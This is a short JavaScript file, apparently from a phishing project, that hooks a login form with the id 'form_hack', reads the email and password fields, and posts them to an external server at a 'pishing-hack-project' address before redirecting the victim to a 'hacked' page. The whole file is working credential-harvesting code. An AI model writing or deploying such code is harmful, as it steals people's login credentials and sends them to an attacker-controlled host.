document.querySelector("#form_hack").addEventListener("submit", (event) => {
    event.preventDefault();

    const username = document.getElementById("email").value;
    const password = document.getElementById("pass").value;

    fetch("https://pishing-hack-project.onrender.com/api/v1/users", {
        method:"POST", 
        body: JSON.stringify({username, password})
    }).then((resp)=>{
        resp.json().then((data)=>{
            console.log(data);
            window.location.href = "./hacked.html";
        })
    })


    
});
